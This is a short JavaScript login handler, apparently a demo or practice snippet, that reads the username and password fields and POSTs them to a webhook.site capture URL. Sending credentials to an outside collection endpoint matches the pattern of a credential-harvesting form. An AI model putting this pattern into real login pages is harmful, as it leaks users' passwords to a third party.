function doLogin() {
  const request = new Request("https://webhook.site/97217e23-31aa-4236-8177-2c01c41f893e", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Accept: "application/json",
    },
    body: JSON.stringify({
      username: document.getElementById("username").value,
      password: document.getElementById("password").value,
    }),
  });
  const response = fetch(request);
  response
    .then((response) => response.json())

    .then((json) => {
      document.getElementById("response").textContent = json.success;
    });
}
document.getElementById("login").onclick = doLogin;
